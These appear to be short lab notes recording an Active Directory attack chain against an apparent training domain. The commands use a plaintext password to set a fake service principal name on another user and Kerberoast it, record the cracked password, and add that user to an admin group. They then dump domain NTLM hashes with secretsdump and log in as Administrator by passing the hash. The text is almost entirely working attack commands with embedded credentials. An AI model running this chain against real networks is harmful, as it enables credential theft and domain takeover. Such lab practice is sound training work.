**Targeted Kerberoast
```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```
- ttimmons:Repeat09

```
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
sudo proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```
